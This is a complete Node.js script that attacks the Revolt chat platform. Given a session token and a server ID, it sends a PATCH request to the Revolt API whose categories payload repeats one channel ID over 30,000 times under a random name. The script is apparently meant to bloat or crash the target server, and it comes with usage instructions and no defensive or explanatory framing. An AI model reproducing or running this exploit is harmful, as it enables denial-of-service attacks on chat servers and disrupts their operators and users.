(async()=>{
    // Dependencies
    const request = require("request-async")

    // Variables
    const args = process.argv.slice(2)

    // Functions
    function makePayload(){
        const payload = [{
			"id": "01G6RWR7T7S90DEPQ7WDP4MZTF",
			"title": makeName(),
			"channels": []
		}]

        for( let i = 0; i <= 30000; i++ ) payload[0].channels.push("01G6SPXW3T6F4M9699MATH2BAF")

        return payload
    }

    function makeName(){
        var payload = String.fromCharCode(Math.floor(Math.random() * 9999))

        for( let i = 0; i <= 30; i++ ) payload += `${String.fromCharCode(Math.floor(Math.random() * 9999))}`

        return payload
    }

    // Main
    if(!args.length) return console.log("usage: node index.js <token> <serverID>")
    if(!args[1]) return console.log("Invalid serverID.")

    var response = await request(`https://api.revolt.chat/servers/${args[1]}`, {
        method: "PATCH",
        headers: {
            "content-type": "application/json",
            "x-session-token": args[0]
        },
        body: JSON.stringify({ categories: makePayload() })
    })

    console.log(`Payload sent(Size): ${response.body.length}`)
    console.log(response.statusCode)
})()